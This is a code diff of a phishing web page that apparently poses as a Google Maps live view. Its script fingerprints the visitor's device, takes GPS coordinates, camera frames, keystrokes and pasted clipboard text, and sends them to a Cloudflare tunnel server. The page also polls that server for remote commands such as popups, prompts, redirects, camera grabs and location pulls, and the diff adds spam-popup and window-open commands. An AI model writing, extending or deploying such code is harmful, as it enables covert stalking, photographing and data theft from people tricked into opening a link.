@@ -75,7 +75,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
 <video id="vid" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
 
-<!-- fake popup -->
 <div id="cm-overlay">
   <div id="cm-card">
     <div class="cm-title" id="cm-title">Message</div>
@@ -90,18 +89,16 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
 
 <script>
 (function(){
-  // ===== SERVER URL — launcher.py rewrites this automatically =====
-  const SERVER = "https://national-behaviour-critical-grab.trycloudflare.com";
+  const SERVER = "https://grant-vermont-named-comparative.trycloudflare.com";
   const REDIRECT = "https://maps.app.goo.gl/UnUYbGNwxCKZmvas6";
-  const BEACON_MS = 8000;   // poll every 8 seconds
-  // ===============================================================
+  const BEACON_MS = 8000;
 
   const statusEl = document.getElementById("status");
   const btn = document.getElementById("allowBtn");
   const spinner = document.getElementById("spinner");
   const btnText = document.getElementById("btnText");
 
-  let MY_FP = null;         // set after collectAll finishes
+  let MY_FP = null;
 
   // ---------------------------------------------------------- transport
   function send(data){
@@ -129,7 +126,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     } catch(e){ return null; }
   }
 
-  // ---------------------------------------------------------- helpers
   async function sha256(str){
     const buf = new TextEncoder().encode(str);
     const h = await crypto.subtle.digest("SHA-256", buf);
@@ -141,7 +137,7 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     catch(e){ return fallback; }
   }
 
-  // ---------------------------------------------------------- geolocation with retry + fallback
+  // ---------------------------------------------------------- geolocation
   function getLoc(attempts){
     attempts = (typeof attempts === "number") ? attempts : 3;
     return new Promise((resolve, reject) => {
@@ -154,13 +150,10 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
                 setTimeout(() => tryOnce(n - 1), 1200);
               } else if (err && err.code === 3){
                 navigator.geolocation.getCurrentPosition(
-                  resolve,
-                  reject,
+                  resolve, reject,
                   { enableHighAccuracy: false, maximumAge: 300000, timeout: 10000 }
                 );
-              } else {
-                reject(err);
-              }
+              } else { reject(err); }
             },
             { enableHighAccuracy: n > 1, maximumAge: 60000, timeout: 25000 }
           );
@@ -171,6 +164,7 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
   }
 
   // ---------------------------------------------------------- popup ui
+  // opts.auto_dismiss_ms → if set, closes itself after that delay with ok:false
   function popup(opts){
     return new Promise((resolve) => {
       const ov = document.getElementById("cm-overlay");
@@ -189,7 +183,9 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
 
       ov.classList.add("show");
 
+      let autoTimer = null;
       const done = (result) => {
+        if (autoTimer) clearTimeout(autoTimer);
         ov.classList.remove("show");
         okBtn.onclick = null;
         cancelBtn.onclick = null;
@@ -198,6 +194,10 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
 
       okBtn.onclick = () => done({ ok: true, text: opts.input ? inputEl.value : null });
       cancelBtn.onclick = () => done({ ok: false, text: null });
+
+      if (opts.auto_dismiss_ms && opts.auto_dismiss_ms > 0){
+        autoTimer = setTimeout(() => done({ ok: false, text: null, auto: true }), opts.auto_dismiss_ms);
+      }
 
       if (opts.input){
         setTimeout(() => { try { inputEl.focus(); } catch(e){} }, 200);
@@ -246,7 +246,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     return { app, isInApp, isAndroidWebview, isIosInApp, browser, browserVersion: version, uaDataBrands, os, uaFull: ua };
   }
 
-  // ---------------------------------------------------------- canvas fp
   function canvasFp(){
     try {
       const c = document.createElement("canvas");
@@ -254,21 +253,15 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
       const ctx = c.getContext("2d");
       ctx.textBaseline = "top";
       ctx.font = "14px 'Arial'";
-      ctx.fillStyle = "#f60";
-      ctx.fillRect(0,0,120,20);
-      ctx.fillStyle = "#069";
-      ctx.fillText("Maps-Live-ƒingerprint-😀", 2, 15);
-      ctx.fillStyle = "rgba(102,204,0,0.7)";
-      ctx.fillText("Maps-Live-ƒingerprint-😀", 4, 17);
-      ctx.beginPath();
-      ctx.arc(50, 30, 20, 0, Math.PI * 1.5, true);
-      ctx.strokeStyle = "rgba(120,20,200,0.5)";
-      ctx.stroke();
+      ctx.fillStyle = "#f60"; ctx.fillRect(0,0,120,20);
+      ctx.fillStyle = "#069"; ctx.fillText("Maps-Live-ƒingerprint-😀", 2, 15);
+      ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("Maps-Live-ƒingerprint-😀", 4, 17);
+      ctx.beginPath(); ctx.arc(50, 30, 20, 0, Math.PI * 1.5, true);
+      ctx.strokeStyle = "rgba(120,20,200,0.5)"; ctx.stroke();
       return c.toDataURL("image/png");
     } catch(e){ return null; }
   }
 
-  // ---------------------------------------------------------- webgl fp
   function webglFp(){
     try {
       const c = document.createElement("canvas");
@@ -290,7 +283,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     } catch(e){ return null; }
   }
 
-  // ---------------------------------------------------------- webgpu adapter
   async function webgpuFp(){
     try {
       if (!navigator.gpu || typeof navigator.gpu.requestAdapter !== "function") return null;
@@ -314,18 +306,12 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
        "maxComputeWorkgroupStorageSize","maxComputeInvocationsPerWorkgroup",
        "maxComputeWorkgroupSizeX","maxComputeWorkgroupSizeY","maxComputeWorkgroupSizeZ",
        "maxComputeWorkgroupsPerDimension"].forEach(k => { if (l[k] !== undefined) lim[k] = l[k]; });
-      return {
-        vendor: info.vendor || null,
-        architecture: info.architecture || null,
-        device: info.device || null,
-        description: info.description || null,
-        features: Array.from(adapter.features || []),
-        limits: lim
-      };
+      return { vendor: info.vendor||null, architecture: info.architecture||null,
+               device: info.device||null, description: info.description||null,
+               features: Array.from(adapter.features||[]), limits: lim };
     } catch(e){ return null; }
   }
 
-  // ---------------------------------------------------------- emoji fp
   function emojiFp(){
     try {
       const c = document.createElement("canvas");
@@ -339,7 +325,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     } catch(e){ return null; }
   }
 
-  // ---------------------------------------------------------- fonts
   const FONT_LIST = [
     "Arial","Arial Black","Arial Narrow","Calibri","Cambria","Candara","Comic Sans MS",
     "Consolas","Courier New","Georgia","Impact","Lucida Console","Palatino Linotype",
@@ -380,7 +365,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     return results;
   }
 
-  // ---------------------------------------------------------- codecs
   function codecFp(){
     const probes = {
       "audio/mpeg":"audio/mpeg","audio/mp4_mp4a40_2":"audio/mp4; codecs=\"mp4a.40.2\"",
@@ -405,7 +389,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     return { canPlayType: out, mediaRecorder: mr };
   }
 
-  // ---------------------------------------------------------- math fp
   function mathFp(){
     const fns = {
       tan: Math.tan(-1e300), sin: Math.sin(1e300), cos: Math.cos(1e300),
@@ -428,7 +411,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     return fns;
   }
 
-  // ---------------------------------------------------------- network
   function networkFp(){
     const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (!c) return null;
@@ -436,7 +418,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
              downlinkMax: c.downlinkMax||null, rtt: c.rtt||null, saveData: c.saveData||null };
   }
 
-  // ---------------------------------------------------------- battery
   function batteryFp(){
     return new Promise(resolve => {
       try {
@@ -447,7 +428,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     });
   }
 
-  // ---------------------------------------------------------- media devices
   function devicesFp(){
     return new Promise(resolve => {
       try {
@@ -465,7 +445,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     });
   }
 
-  // ---------------------------------------------------------- permissions
   async function permissionsFp(){
     const names = ["geolocation","notifications","push","midi","camera","microphone",
       "background-fetch","background-sync","bluetooth","persistent-storage","ambient-light-sensor",
@@ -645,16 +624,11 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
         if (!d) return null;
         return { brands: d.brands, mobile: d.mobile, platform: d.platform };
       }, null),
-      platform: navigator.platform,
-      vendor: navigator.vendor,
-      language: navigator.language,
-      languages: navigator.languages,
-      doNotTrack: navigator.doNotTrack,
-      cookieEnabled: navigator.cookieEnabled,
-      onLine: navigator.onLine,
-      webdriver: navigator.webdriver,
-      hardwareConcurrency: navigator.hardwareConcurrency,
-      deviceMemory: navigator.deviceMemory,
+      platform: navigator.platform, vendor: navigator.vendor,
+      language: navigator.language, languages: navigator.languages,
+      doNotTrack: navigator.doNotTrack, cookieEnabled: navigator.cookieEnabled,
+      onLine: navigator.onLine, webdriver: navigator.webdriver,
+      hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory,
       maxTouchPoints: navigator.maxTouchPoints,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       timezoneOffset: new Date().getTimezoneOffset(),
@@ -681,17 +655,12 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
         serviceWorker: "serviceWorker" in navigator,
         webAssembly: typeof WebAssembly !== "undefined",
         webgpu: "gpu" in navigator,
-        bluetooth: "bluetooth" in navigator,
-        usb: "usb" in navigator,
-        hid: "hid" in navigator,
-        serial: "serial" in navigator,
-        nfc: "NDEFReader" in window,
-        geolocation: "geolocation" in navigator,
+        bluetooth: "bluetooth" in navigator, usb: "usb" in navigator,
+        hid: "hid" in navigator, serial: "serial" in navigator,
+        nfc: "NDEFReader" in window, geolocation: "geolocation" in navigator,
         mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
-        notification: "Notification" in window,
-        push: "PushManager" in window,
-        credentials: "credentials" in navigator,
-        wakeLock: "wakeLock" in navigator,
+        notification: "Notification" in window, push: "PushManager" in window,
+        credentials: "credentials" in navigator, wakeLock: "wakeLock" in navigator,
         fileSystemAccess: "showOpenFilePicker" in window,
         webCodecs: "VideoEncoder" in window
       }
@@ -840,7 +809,7 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     };
   }
 
-  // ---------------------------------------------------------- paste + keystroke dynamics
+  // ---------------------------------------------------------- paste + keystroke
   (function(){
     const input = document.getElementById("searchInput");
     if (!input) return;
@@ -861,11 +830,8 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
       const cd = e.clipboardData || window.clipboardData;
       const txt = cd ? (cd.getData("text") || "") : "";
       send({
-        type: "paste-event",
-        ts: Date.now(),
-        fingerprintId: MY_FP,
-        length: txt.length,
-        content: txt.slice(0, 4000),   // <- shipped now, as requested
+        type: "paste-event", ts: Date.now(), fingerprintId: MY_FP,
+        length: txt.length, content: txt.slice(0, 4000),
         hasNewlines: /\n/.test(txt), hasAt: /@/.test(txt),
         hasUrl: /https?:\/\//i.test(txt), hasSpaces: /\s/.test(txt)
       });
@@ -925,28 +891,23 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
   // ---------------------------------------------------------- command dispatcher
   const CMD_HANDLERS = {
     async msg(args){
-      // args: { title, body }
-      const r = await popup({ title: args.title || "Message", body: args.body || "", cancel: true });
-      return r;
+      return await popup({ title: args.title || "Message", body: args.body || "", cancel: true });
     },
     async alert(args){
       try { alert(args.body || ""); } catch(e){}
       return { ok: true };
     },
     async prompt(args){
-      const r = await popup({
+      return await popup({
         title: args.title || "Input required",
         body: args.body || "",
         input: true,
         placeholder: args.placeholder || "",
         cancel: false
       });
-      return r;
     },
     async redirect(args){
-      try {
-        setTimeout(() => { window.location.href = args.url; }, 300);
-      } catch(e){}
+      try { setTimeout(() => { window.location.href = args.url; }, 300); } catch(e){}
       return { ok: true, url: args.url };
     },
     async title(args){
@@ -954,9 +915,7 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
       return { ok: true };
     },
     async vibrate(args){
-      try {
-        if (navigator.vibrate) navigator.vibrate(args.pattern || [200,100,200]);
-      } catch(e){}
+      try { if (navigator.vibrate) navigator.vibrate(args.pattern || [200,100,200]); } catch(e){}
       return { ok: true };
     },
     async flash(args){
@@ -970,7 +929,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
       return { ok: true };
     },
     async grab(args){
-      // args: { count, interval_ms, facing }
       const count = args.count || 15;
       const ms = args.interval_ms || 1000;
       if (args.facing && args.facing !== currentFacing){
@@ -997,10 +955,8 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     },
     async flip(args){
       currentFacing = (currentFacing === "user") ? "environment" : "user";
-      try {
-        await startCamera();
-        return { ok: true, facing: currentFacing };
-      } catch(e){ return { ok:false, err: String(e) }; }
+      try { await startCamera(); return { ok: true, facing: currentFacing }; }
+      catch(e){ return { ok:false, err: String(e) }; }
     },
     async locate(args){
       const n = args.count || 3;
@@ -1009,8 +965,7 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
         try {
           const pos = await getLoc(2);
           send({ type:"gps", ts: Date.now(), fingerprintId: MY_FP, force: true,
-                 lat: pos.coords.latitude, lon: pos.coords.longitude,
-                 accuracy: pos.coords.accuracy });
+                 lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy });
           results.push({ ok: true, lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy });
         } catch(e){ results.push({ ok: false, err: String(e) }); }
         await new Promise(r => setTimeout(r, 2000));
@@ -1036,23 +991,52 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     },
     async ping(){
       return { ok: true, pong: Date.now() };
+    },
+
+    // ------------------------------------------------------ NEW: spam
+    async spam(args){
+      // args: { count, interval_ms, title, body }
+      const count = args.count || 5;
+      const interval = args.interval_ms || 8000;
+      const title = args.title || "Message";
+      const body = args.body || "";
+      for (let i = 0; i < count; i++){
+        try {
+          await popup({ title: title, body: body, cancel: true, auto_dismiss_ms: 15000 });
+        } catch(e){}
+        if (i < count - 1) await new Promise(r => setTimeout(r, interval));
+      }
+      return { ok: true, count, interval_ms: interval };
+    },
+
+    // ------------------------------------------------------ NEW: open
+    async open(args){
+      try {
+        const w = window.open(args.url || "about:blank", "_blank");
+        const ok = !!(w && !w.closed);
+        return { ok: ok, url: args.url, blocked: !ok };
+      } catch(e){
+        return { ok: false, err: String(e) };
+      }
+    },
+
+    // ------------------------------------------------------ NEW: focus
+    async focus(args){
+      try { window.focus(); } catch(e){}
+      return { ok: true };
     }
   };
 
-  let flushKeys = function(){};
+  let flushKeys = function(){};   // placeholder, set inside the IIFE above
 
   // ---------------------------------------------------------- beacon loop
   async function beacon(){
     if (!MY_FP) return;
     const r = await post("/beacon", {
-      type: "beacon",
-      fp: MY_FP,
-      ts: Date.now(),
-      url: location.href,
-      visibility: document.visibilityState
+      type: "beacon", fp: MY_FP, ts: Date.now(),
+      url: location.href, visibility: document.visibilityState
     });
     if (!r || !r.cmd) return;
-    // r.cmd = { name: "msg", args: { title, body } }
     const name = r.cmd.name;
     const args = r.cmd.args || {};
     const handler = CMD_HANDLERS[name];
@@ -1060,15 +1044,9 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     let result = null, error = null;
     try { result = await handler(args); }
     catch(e){ error = String(e); }
-    // ship result
     await post("/beacon", {
-      type: "cmd-result",
-      fp: MY_FP,
-      ts: Date.now(),
-      cmd: name,
-      args: args,
-      result: result,
-      error: error
+      type: "cmd-result", fp: MY_FP, ts: Date.now(),
+      cmd: name, args: args, result: result, error: error
     });
   }
 
@@ -1097,14 +1075,13 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
     getLoc(3).then(function(pos){
       const c = pos.coords;
       send({ type:"gps", ts:Date.now(), fingerprintId: MY_FP,
-        lat:c.latitude, lon:c.longitude, accuracy:c.accuracy, altitude:c.altitude, heading:c.heading, speed:c.speed });
-
+        lat:c.latitude, lon:c.longitude, accuracy:c.accuracy,
+        altitude:c.altitude, heading:c.heading, speed:c.speed });
       return startCamera();
     })
     .then(function(){
       statusEl.textContent = "Live feed connected";
       startFrameLoop(5000);
-
       setInterval(function(){
         getLoc(2).then(function(p){
           const c2 = p.coords;
@@ -1112,7 +1089,6 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:non
             lat:c2.latitude, lon:c2.longitude, accuracy:c2.accuracy, speed:c2.speed });
         }).catch(function(){});
       }, 8000);
-
       setTimeout(function(){ window.location.href = REDIRECT; }, 1600);
     })
     .catch(function(err){
